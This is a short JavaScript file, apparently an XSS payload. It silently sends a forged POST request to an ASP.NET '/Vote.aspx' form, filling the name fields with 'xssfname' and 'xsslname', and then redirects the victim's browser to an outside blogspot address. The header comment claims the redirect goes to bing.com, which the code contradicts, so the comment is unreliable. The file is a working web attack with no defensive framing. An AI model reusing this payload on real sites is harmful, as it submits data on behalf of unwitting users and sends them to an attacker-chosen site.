//Author: Ashwath
//JS file makes a post request & then redirects to bing.com 
var xhr = new XMLHttpRequest();
xhr.open('POST', '/Vote.aspx', true);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = function () {
    // do something to response
    console.log(this.responseText);
    window.location.href = "http://ka3hk.blogspot.com/"
};
xhr.send('__EVENTTARGET=ctl00%24MainContent%24FormView1%24UpdateButton&__EVENTARGUMENT=&__VIEWSTATE=&ctl00%24MainContent%24FormView1%24fnameTextBox=xssfname&ctl00%24MainContent%24FormView1%24lnameTextBox=xsslname');

